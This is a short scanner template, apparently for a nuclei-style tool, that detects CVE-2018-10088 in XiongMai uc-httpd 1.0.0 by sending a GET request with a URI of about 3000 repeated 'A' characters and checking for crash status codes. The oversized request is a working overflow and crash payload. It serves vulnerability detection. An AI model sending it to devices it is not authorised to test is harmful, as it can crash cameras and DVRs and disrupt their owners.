[info]
author = "ave"
description = "向雄迈uc-httpd 1.0.0 Web服务发送超长HTTP请求URI，触发缓冲区溢出，检测服务是否崩溃或响应异常"
id = "POC-AVE-2018-0029"
name = "CVE-2018-10088 PoC"
severity = "critical"
tags = ["ave-2018-0029"]
vuln_id = [
    "CVE-2018-10088",
    "AVE-2018-0029",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/A{{Repeat 3000 'A'}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    0,
]
type = "status"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = [
    "connection reset",
    "no response",
]
